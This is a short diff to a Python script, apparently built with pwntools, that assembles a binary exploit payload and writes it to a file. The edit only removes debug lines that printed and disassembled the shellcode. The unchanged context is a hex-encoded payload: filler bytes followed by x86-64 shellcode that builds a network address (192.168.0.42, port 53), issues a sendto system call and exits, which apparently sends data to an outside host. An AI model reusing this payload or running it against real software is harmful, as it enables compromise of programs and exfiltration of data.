@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-from pwn import process, context, disasm
+from pwn import process, context
 from os import system
 from multiprocessing import Process
 from numpy import array_split
@@ -25,11 +25,6 @@ exploit = "\x33\x20\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41" \
 "\x00\x49\xb8\x02\x00\x00\x35\xc0\xa8\x00\x2a\x41\x50\x49\x89\xe0" \
 "\x41\xb9\x10\x00\x00\x00\xb8\x2c\x00\x00\x00\x0f\x05\xbf\x00\x00" \
 "\x00\x00\xb8\x3c\x00\x00\x00\x0f\x05\x0a"
-
-print(exploit[74:])
-
-print(disasm(exploit[74:].encode('utf-8')))
-
 
 with open('exploit.bin', 'w') as output_file:
     output_file.write(exploit)
